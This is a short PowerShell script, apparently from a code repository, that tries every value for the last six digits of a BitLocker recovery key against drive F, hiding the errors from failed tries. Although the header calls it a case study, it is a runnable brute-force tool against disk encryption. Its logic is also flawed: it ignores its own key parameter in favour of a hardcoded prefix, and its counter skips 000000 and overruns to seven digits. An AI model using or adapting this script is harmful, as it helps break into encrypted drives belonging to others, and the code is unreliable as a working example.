<#
.SYNOPSIS

This is a script to brute force attack the last 6 digits of a Bitlocker recovery key

.DESCRIPTION

At the moment, this only works for the last set of digits of the BitLocker recovery key. 
I will be working in a slightly different version of a BitLocker unlocker which can be run in any version of powershell using a brute force attack for the password only. 
Trying to recovery all values of a recovery key is out of the scope of this script. The script can be created, 
but it is not feasible to do that. This is just a case study and demonstration. 
There are other GitHub repositories that have already tackle this; for example, the following link give you a different take on this matter.

https://github.com/e-ago/bitcracker
Bitlocker-Unlocker -RecoveryKey 624052-103972-656985-334444-632145-675675-681142-

.EXAMPLE

.NOTES
#The value entered for the recovery key has to be in the following format: 624052-103972-656985-334444-632145-675675-681142-

Author: Omar Rosa

#>

function Bitlocker-Unlocker {
    param([string]$RecoveryKey)

    0..999999 | % {
        $count = (1+ $count).ToString('000000')
        Write-Host "$RecoveryKey$count" #This works as an indicator on where the counter is
        Unlock-BitLocker -MountPoint F -RecoveryPassword 624052-103972-656985-334444-632145-675675-681142-$count -ea 0 #-ea 0 is to suppress the errors because of all the wrong tries
    }
}

Bitlocker-Unlocker -RecoveryKey 624052-103972-656985-334444-632145-675675-681142-
